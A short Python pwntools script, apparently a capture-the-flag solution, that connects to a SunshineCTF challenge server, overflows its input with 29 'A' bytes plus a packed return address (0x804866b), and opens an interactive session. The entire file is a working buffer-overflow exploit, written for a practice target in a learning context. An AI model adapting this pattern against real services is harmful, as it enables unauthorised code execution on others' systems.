from pwn import *
import socket
def main():
	p = socket.socket()
	p.connect(('chal1.sunshinectf.org', 20007))
	p = remote.fromsocket(p)

	p.recvuntil("?")
	p.sendline("A" * 29 + p32(0x804866b))
	p.interactive()

if __name__ == "__main__":
	main()